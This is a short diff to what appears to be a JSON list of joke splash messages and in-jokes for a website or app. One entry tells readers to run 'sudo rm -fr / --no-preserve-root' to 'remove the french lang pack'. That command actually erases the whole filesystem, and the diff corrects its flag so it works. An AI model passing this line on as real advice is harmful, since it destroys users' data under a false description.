@@ -33,8 +33,9 @@
         "New video in 4 years", 
         "hyprland is pretty cool", 
         "mobile support soon guys", 
-        "run 'sudo rm -rf / -no-preserve-root' on linux to remove the french lang pack",
-        "Chaos vibrates his nose when he talks"
+        "run 'sudo rm -fr / --no-preserve-root' on linux to remove the french lang pack",
+        "Chaos vibrates his nose when he talks",
+	"git commit -m \"final fixes 6\" & git push --force"
     ],
     "faq": {
         "found_footage":{
